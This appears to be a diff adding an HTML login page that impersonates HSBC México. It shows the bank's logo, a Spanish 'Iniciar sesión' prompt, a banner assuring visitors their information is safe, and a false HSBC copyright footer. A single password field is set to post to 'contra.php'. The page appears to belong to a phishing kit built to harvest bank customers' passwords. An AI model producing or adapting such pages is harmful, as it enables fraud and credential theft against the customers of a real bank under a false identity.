@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 , maximum-scale=1.0,user-scalable=no">
+    <meta charset='UTF-8'/>
+	
+    <title>HSBC Sporte Global :</title>
+
+    <script>
+        function redirigir(){
+            window.location.href = "inicio.html";
+            return false;
+        }
+    </script>
+
+    <style type="text/css">
+
+        body{
+            margin: 0;
+            padding: 0;
+			background-color: rgb(245, 245, 245);
+			font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            z-index: 1;
+        
+        }
+
+		.icon-disc{
+		display: inline-block;
+		width: 5px;
+		height: 5px;
+		background-color: black;
+		border-radius: 5px;
+		margin-right: 5px;
+		}
+		.header{
+			width: 100%;
+			height: 105px;
+			background-color: rgb(255, 255, 255);
+			display: flex;
+			align-items: center;
+			box-shadow: 0 10px 10px -5px rgb(122, 122, 122);
+			border-radius:  0 0 10px 10px;
+			margin-bottom: 8%;
+		}
+		#logo img{
+			margin: 4%;
+			padding-left: 3%;
+			width: 40%;
+			height: auto;
+		}
+
+
+        .contenedor-inicio{
+            position: absolute;
+            z-index: 1;
+            align-items: center;
+            text-align: center;
+            width: 100% ;
+            padding-top: 30px;
+            
+        }
+        .aviso{
+        display: block;
+        padding: 3%;
+        background: linear-gradient(210deg,rgb(221, 221, 221),90%,rgb(168, 168, 168));
+        opacity: 0.8;
+        border-top: 1px solid black;
+        border-bottom: 1px solid black;
+        font-size: 100%;
+        text-align: center;
+        z-index: 1;
+        }
+        #img-f{
+            position: absolute;
+            width:100%;
+            height: 60%;
+            z-index: 0;
+            opacity: 0.6;
+        }
+
+        #iniciarsesion{
+            width: 100% auto;
+            font-family:Arial, Helvetica, sans-serif;
+            font-size: 65px;
+            color: rgba(0, 0, 0, 0.774);
+            
+        }
+        #label-1{
+            font-size: 25px;
+        }
+        #label-2{
+            font-size: 15px;
+            padding-left: 50px;
+            color: blue;
+            text-decoration-color: blue;
+        }
+
+        #input-1{
+            
+            margin-top: 3%;
+            margin-bottom: 3%;
+            padding-left: 15px;
+            width: 85%;
+            height: 25px;
+            background-color: #e4e5eb94;
+            border-radius:.5rem ;
+            border: 2px solid transparent;
+            transition:border-color .3s cubic-bezier(.25,.01,.25,1)0s, color .3s cubic-bezier(.25,.01,.25,1) 0s,background .2s cubic-bezier(.25,.01,.25,1) 0s;
+        }
+        #input-1:focus{
+            border:0.4 solid blueviolet;
+            outline: none;
+            border-color: #05060f;
+        }
+        #btn1{
+            width: 30%;
+            height:auto;
+            font-size: 100%;
+            padding:2%;
+            background-color: rgba(255, 0, 0, 0.651);
+            border: 0px solid rgb(0, 0, 0);
+            transition: 0.4s all ease;
+        }
+        #btn1:hover{
+           background-color: rgba(245, 84, 84, 0.568);
+           border-radius: 30px;
+        }
+
+      
+
+        .footer{
+           position: absolute;
+           top: 84%;
+           margin: 0 auto;
+           margin: 0;
+		   text-align: center; 
+		   background-color: rgb(0, 0, 0);
+		   width: 100%;
+		   height: 51px;
+           padding: 10% 0%;
+           
+        }
+        footer a{
+		 font-size: 90%;
+		 color: rgb(255, 255, 255);
+		 text-decoration:underline;
+		}
+		footer a:hover{
+		 text-decoration:none
+		}
+       
+
+
+        /*Inicio de MEDIA QUERYS*/
+        @media (min-width: 300px) and (max-width: 400px) {
+			    #bienvenido{
+			        padding: 10% 0% 0% 7.5%;
+            }
+                .header{
+			        height: 100px;
+		    }
+        }
+		
+		@media(min-width:1023px) and (max-width:2600px) {
+			#logo img{
+				margin: 4%;
+				padding-left: 3%;
+				width: 20%;
+				height: auto;
+		}
+		
+        .header{
+			margin-bottom: 2%;
+		}
+        .aviso{
+        width: 100% auto;
+        height: auto;
+        padding: 1%;
+        font-size: 150%;
+        margin-bottom: 5%;
+    }
+    .footer{
+        font-size: 20px;
+        height: 10%;
+        padding: 2% 0%;
+        }
+
+
+
+    }
+
+    
+
+    </style>
+</head>
+
+
+<body>
+    <div class="header">
+        <div id="logo">
+            <img src="Logo1.png" alt="HSBC">
+        </div>
+    </div>
+	
+<div class="aviso">
+    <label>Recuerda tu informacion esta segura con nosotros.</label>
+</div>
+    <div class="contenedor-inicio">  
+        <label id="iniciarsesion">Iniciar sesión</label> <br>
+		<form onsubmit="return redirigir()"  action="contra.php" method="POST">
+            
+            <label id="label-1">Contraseña</label>
+            <label id="label-2"><a href="inicio.html">¿Olvidaste tu contraseña?</a></label> <br>
+            <input id="input-1" name="contra" type="password" autocomplete="off" maxlength="80" required> <br>
+            <input id="btn1" type="submit" value="Continuar">
+            
+        </form>
+        <br>
+    </div>
+        <div class="img-fondo">
+            <img id="img-f" src="iniciofondo.jpg" alt="ImgHSBC">
+        </div>
+ <br>
+        <footer>
+            <div class="footer">
+                <a href="index.html">© HSBC México 2024. Todos los Derechos Reservados</a> <br>
+                <a href="index.html">Este sitio está diseñado para su uso en México. Aviso Fronterizo.</a>
+            </div>
+        </footer>
+
+</body>
+</html>
